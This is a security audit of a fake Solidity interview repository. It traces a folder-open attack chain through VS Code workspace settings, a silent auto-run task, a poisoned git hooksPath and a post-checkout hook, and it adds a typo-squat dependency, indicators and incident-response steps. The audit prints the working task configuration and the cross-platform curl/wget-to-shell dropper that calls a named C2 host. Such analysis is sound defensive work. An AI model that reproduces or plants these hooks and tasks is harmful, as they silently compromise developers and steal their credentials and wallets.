# Security Audit — Bitbucket `tech_lisa/challenge`

**Source:** https://bitbucket.org/tech_lisa/challenge/src/master/
**Commit reviewed:** `09248c28f5e350731dcca85be1a733d02700b304` (master)
**Auditor role:** Senior OpSec / Blockchain
**Method:** Read-only static review via the Bitbucket REST API. No clone, no install, no editor open.
**Date:** 2026-05-04

---

## Verdict (TL;DR)

**Active malware staged behind a fake "Solidity tech-interview challenge."**

A four-stage cross-platform RCE chain fires the moment the folder is opened in any VS Code-family editor (VS Code, Cursor, VSCodium, Code-OSS). It also poisons the local git config so the payload re-fires on every subsequent `git checkout / pull / merge / rebase`. A separate install-time vector exists via a typo-squat dependency.

This is the same threat-actor cluster (Vercel-hosted C2, fake-interview lure) as the previously audited `0xmintmvp/assignment` — and the tradecraft here is **noticeably more polished**: it pre-suppresses the VS Code "Allow Automatic Tasks?" consent dialog, hides the malicious git hook among nine stock samples, and establishes git-level persistence.

**Do not:** clone onto a daily-driver host, open in any IDE, run `npm install`, run `npm run test`, run any `git` command after opening in VS Code.
**If you already did:** treat the host as compromised — see § 7.

![1](/assets/BitAngels/1.png)

---

## 1. Repository inventory

Top level (5 dirs, 5 files):

```
.githooks/      .vscode/        contracts/      scripts/        test/
.babelrc        .gitignore      README.md       hardhat.config.cjs   package.json
```

`.vscode/` contents:

```
settings.json      (configures workspace to allow automatic tasks)
tasks.json         (auto-task definition; fires on folder open)
```

`.githooks/` contents (10 files, sizes in bytes):

```
applypatch-msg        478    pre-applypatch        424
commit-msg            896    pre-commit          1,649
fsmonitor-watchman  4,726    pre-merge-commit      416
post-checkout       2,728    pre-push            1,374
post-update           189    pre-rebase          4,898
```

All file sizes except **`post-checkout`** match Git's stock `.sample` hook templates byte-for-byte. `post-checkout` is **not** one of Git's default samples — it is the one carrying the payload. The other nine are camouflage.

`contracts/`, `scripts/deploy.js`, `hardhat.config.cjs`, `test/` are an ordinary Hardhat ERC-20 scaffold. **Not** the attack surface — stage dressing for the lure.

---

## 2. The implant — kill chain (4 stages)

### Stage 1 — `.vscode/settings.json` (consent-prompt bypass)

```json
{ "task.allowAutomaticTasks": "on" }
```

VS Code introduced *Allow Automatic Tasks* in 2022 specifically to defeat the `folderOpen` task-RCE technique: by default, the user gets a one-time prompt asking whether to enable automatic tasks for a workspace. Setting `task.allowAutomaticTasks` to `"on"` **at the workspace level pre-answers that prompt**, so the victim is never asked.

This is the key upgrade over `0xmintmvp/assignment` and shows the actor has iterated.

### Stage 2 — `.vscode/tasks.json` (autorun on folder open)

```json
{
  "version": "2.0.0",
  "tasks": [{
    "label": "Git checkout to default branch",
    "type":  "shell",
    "command": "git config core.hooksPath .githooks; git checkout master",
    "presentation": {
      "reveal": "never", "echo": false, "focus": false, "close": true,
      "panel": "dedicated", "showReuseMessage": false, "clear": true
    },
    "runOptions": { "runOn": "folderOpen" },
    "problemMatcher": []
  }]
}
```

On `folderOpen`, VS Code spawns this task — silent (`reveal: never`, `echo: false`, `focus: false`, `close: true`). The task does two things in one shell line:

1. **`git config core.hooksPath .githooks`** — repoints this repository's git hooks at the attacker-controlled `.githooks/` directory. From now on, *all* git operations in this repo execute scripts in `.githooks/` instead of `.git/hooks/`.
2. **`git checkout master`** — explicitly triggers the `post-checkout` hook so Stage 3 fires immediately.

The label *"Git checkout to default branch"* is benign-sounding; the silent presentation prevents the victim from seeing the command run.

### Stage 3 — `.githooks/post-checkout` (cross-platform dropper)

The file is ~50 lines of fake innocuous comments (looks like a copy-pasted hook tutorial) followed by:

```sh
uname_s="$(uname -s 2>/dev/null || echo unknown)"
case "$uname_s" in
  Darwin)
    curl -s 'https://gitconfig-nyx-v1.vercel.app/settings/mac?token=6c1d60d35852ef0c05df' \
      | sh  >/dev/null 2>&1
    exit 0
    ;;
  Linux)
    wget -qO- 'https://gitconfig-nyx-v1.vercel.app/settings/linux?token=6c1d60d35852ef0c05df' \
      | sh  >/dev/null 2>&1
    exit 0
    ;;
  MINGW*|MSYS*|CYGWIN*)
    curl -s  https://gitconfig-nyx-v1.vercel.app/settings/windows?token=6c1d60d35852ef0c05df \
      | cmd >/dev/null 2>&1
    exit 0
    ;;
  *)
    exit 0
    ;;
esac
```

Properties:

- **Cross-platform**: Mac (`curl | sh`), Linux (`wget | sh`), Windows (Git Bash `curl | cmd`). The actor cares about covering all developer hosts.
- **C2 host:** `gitconfig-nyx-v1.vercel.app` — Vercel-hosted, named to look like a benign git-config helper service. Same hosting pattern as the previously seen `checkmyip-address.vercel.app` — likely same actor cluster, different per-campaign domain.
- **Per-campaign token** in the query string (`6c1d60d35852ef0c05df`) — used by the operator to track infections and possibly serve targeted second-stage payloads.
- **Server returns shell** (Mac/Linux) or **`cmd` batch** (Windows). The body of the response is **not** in the repo — it is fetched at runtime. Whatever it contains executes with the developer's privileges. Standard payload class for this cluster: wallet/credential infostealer plus a Node-based RAT (BeaverTail / InvisibleFerret family).
- **Silent**: all output redirected to `/dev/null`, errors suppressed, hook exits 0 to keep the checkout chain healthy.
- **Comment camouflage**: the long innocuous-comment block is designed to defeat a manual eyeballing of the hook (reviewer sees a wall of generic git-hook chatter and skims past).

### Stage 4 — persistence via poisoned `core.hooksPath`

Because Stage 2 wrote `core.hooksPath = .githooks` to **this repository's local git config** (`.git/config`), it persists across editor sessions. Every subsequent `git checkout`, `git pull`, `git merge`, `git rebase` (and any git command that triggers the relevant hook) in this clone will:

- Re-execute `.githooks/post-checkout` (or `pre-rebase`, etc., if the actor adds payloads there later via a pulled commit),
- Re-fetch the latest payload from `gitconfig-nyx-v1.vercel.app`,
- Re-establish whatever the current campaign payload installs.

This makes the infection "live": the operator can rotate tools, swap stealers, add downloaders, and ship them on the fly without changing anything in the repo.

### Net effect

| Action by victim | Result |
|---|---|
| `git clone` only | Repo on disk; no execution (clone does not run hooks because `core.hooksPath` isn't set yet). |
| Open folder in VS Code / Cursor / VSCodium / Code-OSS | **Silent RCE.** Stages 1→2→3→4 all fire. Persistence established. |
| Run `npm install` | Possible *additional* RCE via `chai-as-vec` (see § 3). |
| Any later `git` operation in this clone | **Re-fires payload** with whatever the C2 is currently serving. |

---

## 3. Install-time vector — `package.json`

```json
"devDependencies": {
  "@nomiclabs/hardhat-truffle5": "^2.0.0",
  "@nomiclabs/hardhat-web3":     "^2.0.0",
  "chai":             "^4.3.4",
  "chai-as-vec":      "^2.3.5",      ← typo-squat / not a real chai plugin
  "chai-as-promised": "^7.1.1",
  "hardhat":          "^2.28.4",
  "lodash":           "^4.17.21",
  "rimraf":           "^5.0.0",
  "web3":             "^1.5.2"
}
```

`chai-as-vec` is not a recognised chai plugin. Real ones in this family are `chai-as-promised`, `chai-bn`, `chai-spies`, `chai-http`, `chai-arrays`. The name is placed adjacent to `chai-as-promised`, designed to be missed in a 10-second deps eyeball.

The README directs the victim to run `npm run test`, which requires `npm install` first, which pulls `chai-as-vec` from the npm registry. If the attacker has published a `chai-as-vec` package with a `postinstall` / `preinstall` / `prepare` script, that is a **second, independent RCE** that fires regardless of the VS Code-task chain.

Even if the package is currently benign (or non-existent), its presence indicates an intent to use a typo-squat as a backup vector. Treat its registry resolution as suspect.

There are no `preinstall` / `postinstall` / `prepare` scripts in the root `package.json` itself; install-time RCE would come exclusively from `chai-as-vec` (and any other malicious transitive that may be in `package-lock.json`, though `package-lock.json` is `.gitignore`d here — itself a red flag, see § 5).

---

## 4. Lure / threat-actor pattern

Indicators consistent with the DPRK-linked "Contagious Interview" / "Famous Chollima" cluster (documented by Unit 42, SentinelLabs, ESET, Phylum, Socket.dev, Datadog):

- **Workspace** `tech_lisa`, **repo** `challenge` — recruiter-lure naming.
- **README framing**: *"Tech interview smart contracts coding problem"* with a **1–2 hour Loom video submission** time-pressure — classic interview-lure tradecraft.
- **Plausible task**: ERC-20 with mint/burn/dividend mechanic. Realistic enough to occupy a developer for an hour while the payload runs.
- **Hardhat + Solidity + Truffle stack**: targeting blockchain engineers.
- **Vercel-hosted C2**: matches the hosting pattern of `0xmintmvp/assignment`'s `checkmyip-address.vercel.app`. The Vercel free tier provides fast, ephemeral, plausibly-named subdomains that are hard to block en masse.
- **Cross-platform payload selection** (Mac/Linux/Windows) — matches the documented multi-OS scope of this cluster.
- **Hidden malicious hook among stock Git samples** — known camouflage technique.
- **`task.allowAutomaticTasks: on` to bypass VS Code consent** — iteration on the basic `folderOpen` task RCE that the wider security community has flagged in 2024–2025.

---

## 5. Other smells

- **`package-lock.json` is `.gitignore`d**: prevents reviewers from auditing the exact transitive dep tree. Lock-file omission lets `chai-as-vec`'s actual resolved tarball float to whatever the attacker is currently publishing.
- **`build/`, `artifacts/`, `cache/`, `ganache.log`, `.DS_Store` in `.gitignore`**: ordinary — but `.DS_Store` exclusion plus the macOS-style file naming elsewhere suggests the package was assembled on a Mac (same MO as `0xmintmvp/assignment`).
- **`hardhat.config.cjs`** loads `@nomiclabs/hardhat-web3` and `@nomiclabs/hardhat-truffle5`. Both plugins are end-of-life (deprecated by Hardhat in favour of `@nomicfoundation/*`). Not malicious but signals the manifest was hand-rolled rather than scaffolded recently.
- **`solidity: { version: "0.7.0" }`** is an ancient compiler (current is 0.8.x with native overflow checks). Combined with the dividend-on-ERC-20 task description, this gives the victim a vulnerable surface to work in — possibly so the operator can later complain about a "bug" and request a screen-share / further interaction to extend dwell time. Speculative.
- **`scripts/deploy.js`** is two lines of innocuous code; not the attack surface.
- **`pre-commit` and `pre-push` hooks read** are byte-identical to Git's stock `.sample` files, confirming the camouflage theory.

---

## 6. Files inspected

Read in full and analysed:

- `package.json`
- `README.md`
- `hardhat.config.cjs`
- `.gitignore`
- `.babelrc`
- `.vscode/settings.json`
- `.vscode/tasks.json`
- `.githooks/post-checkout` ← the payload
- `.githooks/pre-commit` (confirmed stock Git sample)
- `.githooks/pre-push` (confirmed stock Git sample)
- `scripts/deploy.js`

Directory-listed (contents not opened — established as stage dressing or stock samples):

- `contracts/` — `IDividends.sol`, `IERC20.sol`, `IMintableToken.sol`, `Migrations.sol`, `SafeMath.sol`, `Token.sol`
- `test/`
- `.githooks/applypatch-msg`, `commit-msg`, `fsmonitor-watchman`, `post-update`, `pre-applypatch`, `pre-merge-commit`, `pre-rebase` (sizes match stock Git `.sample` files)

The C2 payload at `https://gitconfig-nyx-v1.vercel.app/settings/{mac,linux,windows}?token=6c1d60d35852ef0c05df` was **not** fetched as part of this audit. Doing so would (a) tip the operator that the victim is auditing, (b) potentially return a benign decoy if fingerprinted as a researcher, (c) potentially infect the analysis host if the fetch is piped into a shell. Retrieval should only be done from a network-isolated, throwaway VM via `curl` with a generic User-Agent, output written to disk for static analysis — not piped into `sh`/`cmd`.

---

## 7. Incident response

### If you have **not** cloned

Don't. Stop here. Optionally block egress to `*.vercel.app` paths matching `gitconfig-nyx-*` at your proxy as a precaution.

### If you cloned but **never opened the folder in any IDE** and never ran `npm install`

Most likely safe. To confirm:
1. `cd` into the clone and run `git config --local --get core.hooksPath` — output should be empty. If empty, no hooks were repointed; you are fine.
2. Delete the clone. `rm -rf` the directory.

### If you opened the folder in **VS Code / Cursor / VSCodium / Code-OSS** OR ran `npm install` / `npm run test` OR ran any `git` command after opening — assume **full compromise**:

1. **Disconnect the host from the network immediately.**
2. From a **separate, clean machine**, rotate everything reachable from the affected host's user account:
   - SSH keys (revoke from GitHub, GitLab, Bitbucket, AWS, GCP, Azure, internal hosts).
   - Personal access tokens / fine-grained PATs / OAuth app sessions on every code-forge.
   - npm tokens (`npm token revoke`).
   - Cloud creds: AWS keys, GCP service-account JSON, Azure CLI sessions; revoke active sessions.
   - **Crypto wallets** (highest priority for this campaign): MetaMask, Phantom, Rabby, Trust, Exodus, OKX Wallet, Coinbase Wallet, Frame, Rainbow seed phrases — assume drained. If any balance remains, sweep to fresh addresses generated on a never-infected host (ideally a hardware wallet whose seed was never on the compromised machine). Don't trust the displayed balances on the compromised host while sweeping — use a clean host or block explorer.
   - Hardware-wallet companion app data dirs (Ledger Live, Trezor Suite session state, GridPlus Lattice).
   - Browser-saved passwords; logged-in exchange sessions (Binance, Coinbase, Kraken, Bybit, OKX, Bitstamp, Gemini); browser cookie jars.
   - Password-manager unlocked-vault sessions (1Password, Bitwarden, Dashlane, KeePassXC) — assume the vault contents were dumped; rotate the master password from a clean host and rotate every secret inside.
   - Messaging tokens: Slack, Telegram, Discord, Signal desktop linked-device sessions.
   - Email account + 2FA tokens (and TOTP seeds if stored on the affected host).
   - SaaS-admin sessions (Vercel, Netlify, Cloudflare, Heroku, Render, Railway, etc.).
3. **Wipe and reimage** the affected machine. Do not rely on AV cleanup — the Stage-3 fetched payload almost certainly installed persistence (macOS LaunchAgent under `~/Library/LaunchAgents`, Linux systemd user unit, Windows Run-key / scheduled task / Startup folder). Restore from backups predating the incident only.
4. **Hooks-path audit on other repos**: from a clean host, for every other repo you've cloned, run `git config --local --get core.hooksPath`. Any repo returning a non-empty value should be deleted (or have `.git/config` and `.git/hooks/` inspected before reuse).
5. **Network forensics**: pull DNS/proxy logs for any host that opened this repo. Search for resolutions of `gitconfig-nyx-v1.vercel.app` (and `*.vercel.app` with the `nyx` or `gitconfig` patterns). Pivot on the source IPs to identify any colleagues also affected.
6. **Report**:
   - Bitbucket abuse: `abuse@bitbucket.org` and Atlassian security `security@atlassian.com`. Include the commit hash above.
   - Vercel abuse: `abuse@vercel.com`. Provide the C2 URL.
   - Submit `.githooks/post-checkout` and (if you can safely fetch it) the Stage-3 body to VirusTotal, MalwareBazaar (tag `contagious-interview`, `dprk`, `vscode-tasks-rce`), Socket.dev, Phylum.
   - If you are in the US, file with IC3 (`ic3.gov`) referencing the DPRK-recruitment campaign; in the EU, file with your national CERT.
7. **The "recruiter"** who sent the challenge is part of the operation. Their LinkedIn / Telegram / Discord / Calendly persona is fake. Block, preserve full message history (timestamps, screenshots, profile URLs, scheduling links) for your IR file. Warn anyone they may also have contacted.

---

## 8. Severity-ranked finding list

| # | Sev | Location | Issue |
|---|-----|----------|-------|
| 1 | **Critical** | `.vscode/tasks.json` | `folderOpen` shell task silently runs `git config core.hooksPath .githooks; git checkout master`. |
| 2 | **Critical** | `.vscode/settings.json` | `task.allowAutomaticTasks: "on"` pre-suppresses the VS Code consent prompt for `folderOpen` tasks. |
| 3 | **Critical** | `.githooks/post-checkout` | Cross-platform `curl/wget | sh` & `curl | cmd` dropper fetching from `https://gitconfig-nyx-v1.vercel.app/settings/{mac,linux,windows}?token=6c1d60d35852ef0c05df`. |
| 4 | **Critical** | local `.git/config` (post-detonation) | `core.hooksPath` poisoning establishes persistence; every future `git` op re-fires the payload. |
| 5 | **High** | `package.json` `chai-as-vec@^2.3.5` | Typo-squat / non-existent chai plugin; install-time RCE vector via `npm install`. |
| 6 | **High** | `package.json` (no lockfile) | `package-lock.json` is `.gitignore`d, hiding the actual resolved dep tree from review. |
| 7 | **Low** | `.githooks/*` (the other 9) | Stock Git `.sample` files repackaged — camouflage; not malicious in themselves but exist solely to obscure `post-checkout`. |
| 8 | **Info** | `hardhat.config.cjs` | EOL `@nomiclabs/*` plugins and ancient Solidity 0.7.0 — irrelevant to security but signals manual assembly of the lure. |

---

## 9. Bottom line

This is **not** a coding challenge. It is a **weaponised recruitment lure** with a polished, multi-stage cross-platform implant. The trap fires the moment the folder is opened in any VS Code-family editor — no install, no run command, no consent prompt — and establishes persistent re-execution through git itself. A backup install-time vector exists via a typo-squat dependency.

The Hardhat scaffold, the ERC-20 dividend task, the time-pressured Loom-video submission, the recruiter-style workspace name, the Vercel-hosted C2, and the hidden malicious git hook collectively match the published TTPs of the DPRK-aligned "Contagious Interview" cluster — and represent a measurable iteration on the same actor's earlier `0xmintmvp/assignment` repo (consent-prompt bypass added; persistence via `core.hooksPath` added; payload moved out of the repo to a remote-fetched body for plausible deniability and on-demand rotation).

**Recommendation:** report and destroy. Do not deobfuscate or fetch the C2 body outside a network-isolated, throwaway VM. Treat anyone in your network who received the same "challenge" as a fellow victim and chase down everyone the recruiter persona may also have approached.

![2](/assets/BitAngels/2.png)
![3](/assets/BitAngels/3.png)
![4](/assets/BitAngels/4.png)
![5](/assets/BitAngels/5.png)
![6](/assets/BitAngels/6.png)
![7](/assets/BitAngels/7.png)
![8](/assets/BitAngels/8.png)
![9](/assets/BitAngels/9.png)
![10](/assets/BitAngels/10.png)
![11](/assets/BitAngels/11.png)

https://bitbucket.org/tech_lisa/challenge/src/master/
https://www.linkedin.com/in/jim-cremin-2624216/